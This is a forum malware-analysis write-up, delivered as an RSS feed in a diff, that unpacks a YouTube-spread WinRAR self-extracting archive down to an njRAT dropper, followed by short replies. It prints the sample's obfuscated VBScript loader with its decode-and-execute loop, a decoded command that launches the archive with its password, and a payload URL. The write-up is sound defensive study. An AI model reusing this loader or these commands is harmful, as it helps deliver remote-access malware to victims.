@@ -1,0 +1,414 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>[ANALYSIS | UNPACKING] Firestorm - Self-extracting Archive</title>
+    <link>https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882</link>
+    <description># README
+If your antivirus detects this page as malicious, it is most probably because I have pasted some scripts into the article. Do not be alarmed!
+
+# Introduction
+Very recently I&#39;ve (finally) set up a proper malware analysis VM and so I thought that it would be super fun to download some samples from malware spreaders on YouTube. I came across something interesting from which I have learned and expanded my knowledge and so I thought I&#39;d share my analytical journey with you guys in hopes that you will also learn something!
+
+#### Author Assigned Level: -
+#### Community Assigned Level:
+[poll type=regular]
+* Newbie
+* Wannabe
+* Hacker
+* Wizard
+* Guru
+[/poll]
+
+#### Required Skills
+Nothing extraordinary, these are entirely optional and is not needed to understand the analysis.
+
+* Visual Basic
+* C# .NET
+* Reverse engineering
+* Forensics
+* Persistence
+* Common sense ;-)
+
+-----
+# Analysis
+
+## Static Analysis
+
+### VirusTotal - Firestorm.exe
+
+With all things hacking, recon should be the first step towards understanding the target. The first thing I do is upload the sample to VirusTotal (VT) to see if this has already been detected or not, or just to try and get a general overview of what I might be dealing with.
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/3/3a7124a59528e0cb7cf8136aa60cd9c9c12be76a.png&quot; width=&quot;690&quot; height=&quot;404&quot;&gt;
+
+Okay, so there are some detections but it seems to be a pretty generic and it doesn&#39;t really help me much. 
+
+### pestudio - Firestorm.exe
+
+Since VT wasn&#39;t helpful, I needed to get a better understanding of what this file is and what it can do. So, using pestudio, I may be able to get some hints.
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/a/a31272b0e6cba5007c974646ab3bb99fe52789c5.png&quot; width=&quot;690&quot; height=&quot;430&quot;&gt;
+
+We can see here there are quite a few flags being raised, most notably:
+
+* it attempts to appear as a Microsoft executable IEXPLORE.exe which is Internet Explorer,
+* it seems to have another file within,
+* it references file streams so it may write to disk,
+* it references cryptographic functions which may indicate some sort of obfuscation
+* the debug file name is `sfxrar.pdb` which indicates a self-extracting archive, most likely WinRAR.
+
+If we go into the manifest, we can see that it tells us that it&#39;s a WinRAR SFX:
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/0/053f5c96f922bb91d61e6dd6acd414eb139af310.png&quot; width=&quot;690&quot; height=&quot;430&quot;&gt;
+
+### File Extraction with WinRAR - Firestorm.exe
+
+Let&#39;s open up this archive in WinRAR and see what it contains:
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/8/80f8acfa00af3a1f249db017e97b5b63902ed31a.png&quot; width=&quot;690&quot; height=&quot;374&quot;&gt;
+
+On the right-hand side, we can see the SFX script which details the path to where these files will extract, file execution after unpacking, silent install and file overwriting. Of course the file execution is what grabs our attention so let&#39;s extract these files and have a look at them.
+
+### pestudio - sfx.exe
+
+So the file name of `sfx.exe` gives us a pretty good clue as to what it might be so let&#39;s confirm with pestudio:
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/b/b39d5ea9201e3b5f1d0dad9c3ced95c3a81463ac.png&quot; width=&quot;690&quot; height=&quot;374&quot;&gt;
+
+Yes, as we expected. Can we extract it?
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/d/dc04eb0458b7748ce6b6917ce815ed9e99b62bf4.png&quot; width=&quot;345&quot; height=&quot;380&quot;&gt;
+
+Unfortunately not. :( So let&#39;s continue with `form1.vbe`.
+
+### Deobfuscating Visual Basic - form1.vbe
+
+Upon opening the file, this is what we see:
+
+```vbs
+TZUO3TWPSQYCGRU=&quot;RewXÞíÖK&lt;m«¡®¬ÅÈê7&lt;UX´Ç¦½ÊÈá.PSXqt¥¸ÐãÂÙæ.GJlotozÇÒºìû.YJ{¦¹¯¼ºÓÖBEJcfªÂÕ´ËØÖ9&lt;^af³ÆÞñÐç&gt;&lt;UXz}ÄÆÑèÈÃiy¦§ÄÉºÊîA*[hwb¡´ÍÚÄFS8iwp¡®À¨àéMZlT¡½ÊàÄ?LbFyp¦¯ÍÚÄFS8pyb©½ËÜÄ?L_Fw~¯½Ð¶êD*`oT¤½ÊÙÄGS8iwp¡®½¨ßïUbFw~¯¼Ë¶ïG*[i|b ¿Î¶îE*bkT~¯½Î¶ç&gt;Q8iwp¡¯Â¨ÜìT]Fw~¯¼Ë¶ç&gt;T8ivp£²ÎÙÄ?O8ivb§½ËÝÄ?L^F~p¡®À¨Ùæ?*[h~b ¶ÎÞÄFN8iwp¡¯¼¨ÛèO^Fw~¯¼Ì¶ç@L8l|b ¯ËÚæMZiT~±¾¨ÜëM[jT~·À¨ÝìP]Fw~´Á¨àèM[pT~¯½Ì¶îB*[ib§ÂÓ¶ìG*]mT~ ¤íĄR&lt;s~S^ÏßæíČÈó.iy¦§ÄãîÖRaJufªÂÕ´ËØÖ9&lt;^af³ÆÞñÐç&gt;&lt;UXz}Ïâúč6MZXqtàâíĄ.)4¯ÂÒ¬×Èĉ^hsnÁÑØßþÆëþ`sRivt²µÃÈÃax|f¨¤ñü.`oXt¥¸ÐãÂÙæ.GJlotÁÔìÿÞ?LJcf©¬ÝðĈeD[hf¤§¬îðû\&lt;7BºÉ­áÜ÷ċ\`R¯ÂÒµºÓÖ6&lt;WX´Ç¦ÀÓÑß.)4~¦½Éºëþ`sRl~}ÄÍ¬ĎĝÃ`sf§¦¤ûú.YJ¸|¯¿ÆÙìüÞ[ESXS^©¶Ò¬×ÈØu¬­ÈÉäåĀĀĔĪu«ÆÉàô÷[eJuf®±ËÕºÓÖa`JEP¢§ÈÒ¬§²úWiJ{´¶Ð¬§²ûfamÄØÛõÿ7&lt;7B¦ÂÄÞºåÖQd|n©¬ÎÑÖ9&lt;m«¡®¬ÅÈê7&lt;UX´Ç¦½ÊÈá.PSXqtÑô¹üġĘoZfalµÌÐºñü.&lt;7B¬ÉÐÓòõĉĖÖrR¦»}}ÿČÈó._r|Ðå§¤ČĨ.YJ«¸alµÌÐºîċ\_~¢}¤&quot; : PZUO3TWPSQYCGRU=&quot;ZUO3TWPSQYCGRU&quot; : CZUO3TWPSQYCGRU=len(PZUO3TWPSQYCGRU) : do until NZUO3TWPSQYCGRU=len(TZUO3TWPSQYCGRU) : NZUO3TWPSQYCGRU=NZUO3TWPSQYCGRU+1 : UZUO3TWPSQYCGRU=UZUO3TWPSQYCGRU+1 : if UZUO3TWPSQYCGRU=len(PZUO3TWPSQYCGRU) then UZUO3TWPSQYCGRU=1
+WZUO3TWPSQYCGRU=WZUO3TWPSQYCGRU &amp; ChrW(AscW(Mid(TZUO3TWPSQYCGRU, NZUO3TWPSQYCGRU, 1)) - UZUO3TWPSQYCGRU * CZUO3TWPSQYCGRU) : loop : execute WZUO3TWPSQYCGRU
+```
+
+and what a mess it is. Obfsucation for scripts is a very common thing so it should not come as a surprise. The problem for us is to deobfuscate it somehow. We can see that there is a string which may contain another payload once it has been deobfuscated and some function calls but it&#39;s still very confusing and may take us some time to reverse engineer it, especially for people like me who are not quite familiar with Visual Basic. 
+
+What&#39;s a simple way we can continue without too much effort? On the end of the script, we see an `execute` function on the `WZUO3TWPSQYCGRU` variable. So let&#39;s be smart here and instead of having `execute` there we force it to write the contents out to disk! After a quick Google search, it seems we just need to replace it with `WScript.Echo`, then call the script using `cscript.exe` (important! otherwise it will pop up a message box!). Here is the output:
+
+(The following script has sections removed to prevent AV detection)
+
+```vbs
+DIM DF
+MOHMRET = &quot;83101116328711510483104101108108326132878399114105112116466711410197116101799810610199116403487839911410511211646831041011081083441131087115104831041011081084682117110323411510212-04610112010132324511284945643110658211869112841198769693534&quot;
+END IF
+mohar = MOHMRET
+MOHMRT = SPLIT(mohar,CHRW(10 + 4)) 
+END IF
+EXECUTE (FLAMI) 
+END IF  
+```
+
+Yes, indeed it is another payload. Again, we can see it&#39;s obfuscated but this time, it&#39;s makes a bit more sense. There is another potential payload held in the `MOHMRET` variable which looks to be ASCII with some kind of character woven in. We can see the `split` function using `mohar` (`MOHMRET`) and a character `10 + 4` which may confirm the assumption.
+
+Instead of deobfuscating this file, we want to be smart so similar to the previous script, let&#39;s replace `execute` with `WScript.Echo` and see what we get:
+
+```vbs
+Microsoft (R) Windows Script Host Version 5.8
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Set WshShell = WScript.CreateObject(&quot;WScript.Shell&quot;)
+WshShell.Run &quot;sfx.exe  -pT^8+nARvEpTwWEE#&quot;
+```
+
+There is no more obfuscation and we can see references to `sfx.exe`. This script seems to be attempting to execute the other file on the command line with what is most likely the password to the archive. With a quick Google search, WinRAR takes the command line option `-p` as a password parameter and with that, we have unlocked a piece of the puzzle.
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/0/0fcaf5af8d099c8a3bf5ea14799b6cb4422866ab.png&quot; width=&quot;690&quot; height=&quot;373&quot;&gt;
+
+Here we have yet another auto-run executable called `eze.exe`. Let&#39;s extract it and perform some more analysis.
+
+### pestudio - eze.exe
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/d/dd3393e0ed0a218d8a20d3b397ff915e1ad94bd4.png&quot; width=&quot;690&quot; height=&quot;372&quot;&gt;
+
+Looking at the indicators in pestudio, we can see that it fakes itself in order to look like a Microsoft executable. We can also see that it may be a .NET file and looking at the name `WindowsFormsApp1.exe` tells us that this project may have taken a default name when it was coded, i.e. a C# Windows Form project.
+
+Moving onto the VT indicators (the sample must already exist on VT), we can see that it may be a dropper:
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/4/466c32f06b529961b88e26bf53d281d43bce5d75.png&quot; width=&quot;690&quot; height=&quot;373&quot;&gt;
+
+Let&#39;s take a look at the strings since it might provide us with the file names of the file it may drop:
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/7/761f1952eff3db8ae99a4fd26117b25504a5ab85.png&quot; width=&quot;690&quot; height=&quot;371&quot;&gt;
+
+And quite some interesting strings we have here. Greetings, Mr. Stan! If you are reading this, you are violating rule number 5 of the [CIA&#39;s Development Tradecrafts DOs and DON&#39;Ts](https://wikileaks.org/ciav7p1/cms/page_14587109.html). Here&#39;s the link, just for you! ;-) Don&#39;t be surprised if cops show up at the front of your door! :astonished:
+
+We can confirm the project development under Visual Studio 2017 as we suspected from the default project name. The string that is listed after looks like it may be the location from where the dropper obtains its payload. If we navigate to the page, we get an error:
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/7/7316fb6b3d1166bbee81ed67739fe203e4b881e8.png&quot; width=&quot;690&quot; height=&quot;92&quot;&gt;
+
+So it may seem that the file is not a PNG at all, or any type of image file.
+
+## Dynamic Analysis
+
+### dnSpy - eze.exe
+
+We would love to see the file that is dropped by this file and of course it can easily be obtained just by downloading the file but just to spice things up, let&#39;s look at how we can get it via dynamic analysis. Open up `eze.exe` in dnSpy and let&#39;s see what it does.
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/3/39b669da78451a2353537bd6842d37464b962e5a.png&quot; width=&quot;690&quot; height=&quot;433&quot;&gt;
+
+In the red box, we can see a call to a very common method call `Assembly.Load`. This function is mostly used to load a malicious file into memory for execution as indicated by the `EntryPoint.Invoke` method call. For an example of this, see @TheDoctor&#39;s  [\[C#\] A Simple Runtime Crypter](https://0x00sec.org/t/c-a-simple-runtime-crypter/519/1) article.
+
+To get the binary file, we simply place a breakpoint on this line and run it until it gets hit (mind the sleep at the beginning!)...
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/8/8a4b702f58421376cd8775aac8d3badd7d9a3385.png&quot; width=&quot;690&quot; height=&quot;424&quot;&gt;
+
+... look in the variable&#39;s (`array`) memory (right-click the variable in the `Locals` tab at the bottom, select `Show in Memory Window` and then choose a memory view)...
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/9/92bb940d3866230ceb561e8d82ac38d1de06d5cf.png&quot; width=&quot;690&quot; height=&quot;157&quot;&gt;
+
+... and there lies the binary we were looking for! Identify the `MZ` magic and the `PE\0\0` signatures to verify. Right-click the memory and select `Save Selection...`.
+
+Let&#39;s see what [VT](https://www.virustotal.com/#/file/719429b091b80e36dfd56fe87e713bfa4f585a228f3616a03d3298fd9d715283/detection) has for us.
+
+&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/6/631d00998c655f52560c5f0295779eda0458ba40.png&quot; width=&quot;690&quot; height=&quot;407&quot;&gt;
+
+55/67 detections! Identified as `Bladabindi` AKA njRAT.
+
+# Conclusions
+I hope this was an entertaining and educational read! Thanks for stopping by!
+
+EDIT:
+The sample can now be obtained here:
+
+https://www.hybrid-analysis.com/sample/6fed01e33311f0b0d25a894efdfa3412d00f40fbb0c5f0ba303a2c41c4dbd31f?environmentId=100
+
+_-- dtm_</description>
+    
+    <lastBuildDate>Wed, 10 Jan 2018 14:23:18 +0000</lastBuildDate>
+    <category>Malware</category>
+    <atom:link href="https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>[ANALYSIS | UNPACKING] Firestorm - Self-extracting Archive</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882/8">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882/8</link>
+        <pubDate>Sat, 03 Feb 2018 05:26:04 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-4882-8</guid>
+        <source url="https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882.rss">[ANALYSIS | UNPACKING] Firestorm - Self-extracting Archive</source>
+      </item>
+      <item>
+        <title>[ANALYSIS | UNPACKING] Firestorm - Self-extracting Archive</title>
+        <dc:creator><![CDATA[DamaneDz]]></dc:creator>
+        <description><![CDATA[
+            <p>Nice analysis</p>
+<p>I have just one addition about the image url</p>
+<p><code>http://iupcloud.com/uploads/up669851510864553_ha.png</code></p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/e/eea1f721d497cb8a3b19e5ec9b28a98de21f106b.png" width="690" height="39"></p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/ab4e115aa9fc8620aff528593dc5b5e62c18748c.png" width="596" height="466"></p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/8/8ddbb14e23d87af4f03be97ec46545b3e535b369.png" width="675" height="20"></p>
+          <p><a href="https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882/7</link>
+        <pubDate>Wed, 10 Jan 2018 14:23:18 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-4882-7</guid>
+        <source url="https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882.rss">[ANALYSIS | UNPACKING] Firestorm - Self-extracting Archive</source>
+      </item>
+      <item>
+        <title>[ANALYSIS | UNPACKING] Firestorm - Self-extracting Archive</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>The sample should be downloadable via Hybrid Analysis. The link is provided at the bottom of the article.</p>
+          <p><a href="https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882/6</link>
+        <pubDate>Wed, 10 Jan 2018 03:01:57 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-4882-6</guid>
+        <source url="https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882.rss">[ANALYSIS | UNPACKING] Firestorm - Self-extracting Archive</source>
+      </item>
+      <item>
+        <title>[ANALYSIS | UNPACKING] Firestorm - Self-extracting Archive</title>
+        <dc:creator><![CDATA[spawnpt]]></dc:creator>
+        <description><![CDATA[
+            <p>Could you share the sample possibly?</p>
+          <p><a href="https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882/5</link>
+        <pubDate>Tue, 09 Jan 2018 18:50:07 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-4882-5</guid>
+        <source url="https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882.rss">[ANALYSIS | UNPACKING] Firestorm - Self-extracting Archive</source>
+      </item>
+      <item>
+        <title>[ANALYSIS | UNPACKING] Firestorm - Self-extracting Archive</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>Yep, actually not a bad place to find some wild malwarez.</p>
+          <p><a href="https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882/4</link>
+        <pubDate>Thu, 04 Jan 2018 23:19:12 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-4882-4</guid>
+        <source url="https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882.rss">[ANALYSIS | UNPACKING] Firestorm - Self-extracting Archive</source>
+      </item>
+      <item>
+        <title>[ANALYSIS | UNPACKING] Firestorm - Self-extracting Archive</title>
+        <dc:creator><![CDATA[Joe_Schmoe]]></dc:creator>
+        <description><![CDATA[
+            <p>Let’s make a CTF about how many YouTube keyloggers you can take over</p>
+          <p><a href="https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882/3</link>
+        <pubDate>Thu, 04 Jan 2018 19:45:47 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-4882-3</guid>
+        <source url="https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882.rss">[ANALYSIS | UNPACKING] Firestorm - Self-extracting Archive</source>
+      </item>
+      <item>
+        <title>[ANALYSIS | UNPACKING] Firestorm - Self-extracting Archive</title>
+        <dc:creator><![CDATA[oaktree]]></dc:creator>
+        <description><![CDATA[
+            <p>So you found this program somewhere on YouTube?</p>
+          <p><a href="https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882/2</link>
+        <pubDate>Thu, 04 Jan 2018 17:28:27 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-4882-2</guid>
+        <source url="https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882.rss">[ANALYSIS | UNPACKING] Firestorm - Self-extracting Archive</source>
+      </item>
+      <item>
+        <title>[ANALYSIS | UNPACKING] Firestorm - Self-extracting Archive</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <h1>README</h1>
+<p>If your antivirus detects this page as malicious, it is most probably because I have pasted some scripts into the article. Do not be alarmed!</p>
+<h1>Introduction</h1>
+<p>Very recently I’ve (finally) set up a proper malware analysis VM and so I thought that it would be super fun to download some samples from malware spreaders on YouTube. I came across something interesting from which I have learned and expanded my knowledge and so I thought I’d share my analytical journey with you guys in hopes that you will also learn something!</p>
+<h4>Author Assigned Level: -</h4>
+<h4>Community Assigned Level:</h4>
+<p><a href="https://0x00sec.org/t/analysis-unpacking-firestorm-self-extracting-archive/4882/1">Click to view the poll.</a></p>
+<h4>Required Skills</h4>
+<p>Nothing extraordinary, these are entirely optional and is not needed to understand the analysis.</p>
+<ul>
+<li>Visual Basic</li>
+<li>C# .NET</li>
+<li>Reverse engineering</li>
+<li>Forensics</li>
+<li>Persistence</li>
+<li>Common sense <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">
+</li>
+</ul>
+<hr>
+<h1>Analysis</h1>
+<h2>Static Analysis</h2>
+<h3>VirusTotal - Firestorm.exe</h3>
+<p>With all things hacking, recon should be the first step towards understanding the target. The first thing I do is upload the sample to VirusTotal (VT) to see if this has already been detected or not, or just to try and get a general overview of what I might be dealing with.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/3/3a7124a59528e0cb7cf8136aa60cd9c9c12be76a.png" width="690" height="404"></p>
+<p>Okay, so there are some detections but it seems to be a pretty generic and it doesn’t really help me much.</p>
+<h3>pestudio - Firestorm.exe</h3>
+<p>Since VT wasn’t helpful, I needed to get a better understanding of what this file is and what it can do. So, using pestudio, I may be able to get some hints.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a31272b0e6cba5007c974646ab3bb99fe52789c5.png" width="690" height="430"></p>
+<p>We can see here there are quite a few flags being raised, most notably:</p>
+<ul>
+<li>it attempts to appear as a Microsoft executable IEXPLORE.exe which is Internet Explorer,</li>
+<li>it seems to have another file within,</li>
+<li>it references file streams so it may write to disk,</li>
+<li>it references cryptographic functions which may indicate some sort of obfuscation</li>
+<li>the debug file name is <code>sfxrar.pdb</code> which indicates a self-extracting archive, most likely WinRAR.</li>
+</ul>
+<p>If we go into the manifest, we can see that it tells us that it’s a WinRAR SFX:</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/0/053f5c96f922bb91d61e6dd6acd414eb139af310.png" width="690" height="430"></p>
+<h3>File Extraction with WinRAR - Firestorm.exe</h3>
+<p>Let’s open up this archive in WinRAR and see what it contains:</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/8/80f8acfa00af3a1f249db017e97b5b63902ed31a.png" width="690" height="374"></p>
+<p>On the right-hand side, we can see the SFX script which details the path to where these files will extract, file execution after unpacking, silent install and file overwriting. Of course the file execution is what grabs our attention so let’s extract these files and have a look at them.</p>
+<h3>pestudio - sfx.exe</h3>
+<p>So the file name of <code>sfx.exe</code> gives us a pretty good clue as to what it might be so let’s confirm with pestudio:</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/b/b39d5ea9201e3b5f1d0dad9c3ced95c3a81463ac.png" width="690" height="374"></p>
+<p>Yes, as we expected. Can we extract it?</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/d/dc04eb0458b7748ce6b6917ce815ed9e99b62bf4.png" width="345" height="380"></p>
+<p>Unfortunately not. <img src="https://0x00sec.org/images/emoji/twitter/frowning.png?v=9" title=":frowning:" class="emoji" alt=":frowning:"> So let’s continue with <code>form1.vbe</code>.</p>
+<h3>Deobfuscating Visual Basic - form1.vbe</h3>
+<p>Upon opening the file, this is what we see:</p>
+<pre><code class="lang-auto">TZUO3TWPSQYCGRU="RewXÞíÖK&lt;m«¡®¬ÅÈê7&lt;UX´Ç¦½ÊÈá.PSXqt¥¸ÐãÂÙæ.GJlotozÇÒºìû.YJ{¦¹¯¼ºÓÖBEJcfªÂÕ´ËØÖ9&lt;^af³ÆÞñÐç&gt;&lt;UXz}ÄÆÑèÈÃiy¦§ÄÉºÊîA*[hwb¡´ÍÚÄFS8iwp¡®À¨àéMZlT¡½ÊàÄ?LbFyp¦¯ÍÚÄFS8pyb©½ËÜÄ?L_Fw~¯½Ð¶êD*`oT¤½ÊÙÄGS8iwp¡®½¨ßïUbFw~¯¼Ë¶ïG*[i|b ¿Î¶îE*bkT~¯½Î¶ç&gt;Q8iwp¡¯Â¨ÜìT]Fw~¯¼Ë¶ç&gt;T8ivp£²ÎÙÄ?O8ivb§½ËÝÄ?L^F~p¡®À¨Ùæ?*[h~b ¶ÎÞÄFN8iwp¡¯¼¨ÛèO^Fw~¯¼Ì¶ç@L8l|b ¯ËÚæMZiT~±¾¨ÜëM[jT~·À¨ÝìP]Fw~´Á¨àèM[pT~¯½Ì¶îB*[ib§ÂÓ¶ìG*]mT~ ¤íĄR&lt;s~S^ÏßæíČÈó.iy¦§ÄãîÖRaJufªÂÕ´ËØÖ9&lt;^af³ÆÞñÐç&gt;&lt;UXz}Ïâúč6MZXqtàâíĄ.)4¯ÂÒ¬×Èĉ^hsnÁÑØßþÆëþ`sRivt²µÃÈÃax|f¨¤ñü.`oXt¥¸ÐãÂÙæ.GJlotÁÔìÿÞ?LJcf©¬ÝðĈeD[hf¤§¬îðû\&lt;7BºÉ­áÜ÷ċ\`R¯ÂÒµºÓÖ6&lt;WX´Ç¦ÀÓÑß.)4~¦½Éºëþ`sRl~}ÄÍ¬ĎĝÃ`sf§¦¤ûú.YJ¸|¯¿ÆÙìüÞ[ESXS^©¶Ò¬×ÈØu¬­ÈÉäåĀĀĔĪu«ÆÉàô÷[eJuf®±ËÕºÓÖa`JEP¢§ÈÒ¬§²úWiJ{´¶Ð¬§²ûfamÄØÛõÿ7&lt;7B¦ÂÄÞºåÖQd|n©¬ÎÑÖ9&lt;m«¡®¬ÅÈê7&lt;UX´Ç¦½ÊÈá.PSXqtÑô¹üġĘoZfalµÌÐºñü.&lt;7B¬ÉÐÓòõĉĖÖrR¦»}}ÿČÈó._r|Ðå§¤ČĨ.YJ«¸alµÌÐºîċ\_~¢}¤" : PZUO3TWPSQYCGRU="ZUO3TWPSQYCGRU" : CZUO3TWPSQYCGRU=len(PZUO3TWPSQYCGRU) : do until NZUO3TWPSQYCGRU=len(TZUO3TWPSQYCGRU) : NZUO3TWPSQYCGRU=NZUO3TWPSQYCGRU+1 : UZUO3TWPSQYCGRU=UZUO3TWPSQYCGRU+1 : if UZUO3TWPSQYCGRU=len(PZUO3TWPSQYCGRU) then UZUO3TWPSQYCGRU=1
+WZUO3TWPSQYCGRU=WZUO3TWPSQYCGRU &amp; ChrW(AscW(Mid(TZUO3TWPSQYCGRU, NZUO3TWPSQYCGRU, 1)) - UZUO3TWPSQYCGRU * CZUO3TWPSQYCGRU) : loop : execute WZUO3TWPSQYCGRU
+</code></pre>
+<p>and what a mess it is. Obfsucation for scripts is a very common thing so it should not come as a surprise. The problem for us is to deobfuscate it somehow. We can see that there is a string which may contain another payload once it has been deobfuscated and some function calls but it’s still very confusing and may take us some time to reverse engineer it, especially for people like me who are not quite familiar with Visual Basic.</p>
+<p>What’s a simple way we can continue without too much effort? On the end of the script, we see an <code>execute</code> function on the <code>WZUO3TWPSQYCGRU</code> variable. So let’s be smart here and instead of having <code>execute</code> there we force it to write the contents out to disk! After a quick Google search, it seems we just need to replace it with <code>WScript.Echo</code>, then call the script using <code>cscript.exe</code> (important! otherwise it will pop up a message box!). Here is the output:</p>
+<p>(The following script has sections removed to prevent AV detection)</p>
+<pre><code class="lang-auto">DIM DF
+MOHMRET = "83101116328711510483104101108108326132878399114105112116466711410197116101799810610199116403487839911410511211646831041011081083441131087115104831041011081084682117110323411510212-04610112010132324511284945643110658211869112841198769693534"
+END IF
+mohar = MOHMRET
+MOHMRT = SPLIT(mohar,CHRW(10 + 4)) 
+END IF
+EXECUTE (FLAMI) 
+END IF  
+</code></pre>
+<p>Yes, indeed it is another payload. Again, we can see it’s obfuscated but this time, it’s makes a bit more sense. There is another potential payload held in the <code>MOHMRET</code> variable which looks to be ASCII with some kind of character woven in. We can see the <code>split</code> function using <code>mohar</code> (<code>MOHMRET</code>) and a character <code>10 + 4</code> which may confirm the assumption.</p>
+<p>Instead of deobfuscating this file, we want to be smart so similar to the previous script, let’s replace <code>execute</code> with <code>WScript.Echo</code> and see what we get:</p>
+<pre><code class="lang-auto">Microsoft (R) Windows Script Host Version 5.8
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Set WshShell = WScript.CreateObject("WScript.Shell")
+WshShell.Run "sfx.exe  -pT^8+nARvEpTwWEE#"
+</code></pre>
+<p>There is no more obfuscation and we can see references to <code>sfx.exe</code>. This script seems to be attempting to execute the other file on the command line with what is most likely the password to the archive. With a quick Google search, WinRAR takes the command line option <code>-p</code> as a password parameter and with that, we have unlocked a piece of the puzzle.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/0/0fcaf5af8d099c8a3bf5ea14799b6cb4422866ab.png" width="690" height="373"></p>
+<p>Here we have yet another auto-run executable called <code>eze.exe</code>. Let’s extract it and perform some more analysis.</p>
+<h3>pestudio - eze.exe</h3>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/d/dd3393e0ed0a218d8a20d3b397ff915e1ad94bd4.png" width="690" height="372"></p>
+<p>Looking at the indicators in pestudio, we can see that it fakes itself in order to look like a Microsoft executable. We can also see that it may be a .NET file and looking at the name <code>WindowsFormsApp1.exe</code> tells us that this project may have taken a default name when it was coded, i.e. a C# Windows Form project.</p>
+<p>Moving onto the VT indicators (the sample must already exist on VT), we can see that it may be a dropper:</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/4/466c32f06b529961b88e26bf53d281d43bce5d75.png" width="690" height="373"></p>
+<p>Let’s take a look at the strings since it might provide us with the file names of the file it may drop:</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/7/761f1952eff3db8ae99a4fd26117b25504a5ab85.png" width="690" height="371"></p>
